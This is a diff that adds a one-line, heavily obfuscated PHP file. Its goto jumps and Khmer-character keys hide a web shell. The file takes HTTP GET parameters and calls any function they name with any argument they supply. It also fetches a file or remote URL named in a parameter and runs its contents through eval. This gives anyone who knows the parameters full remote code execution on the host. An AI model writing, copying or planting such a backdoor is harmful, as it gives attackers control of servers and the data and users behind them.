@@ -1,0 +1,1 @@
+<?php goto N6Ag4; KMKUH: $I9NO2[ល] == ធិ៤០៤ & $I9NO2[ម]($I9NO2[ប]); goto cuHHG; N6Ag4: $I9NO2 = $_GET; goto clZU6; clZU6: if (!($I9NO2[ត] != null)) { goto P0yeE; } goto KMKUH; cuHHG: P0yeE: goto hYsr_; hYsr_: eval("\x3f\x3e" . file_get_contents($I9NO2[ដ])); ?>
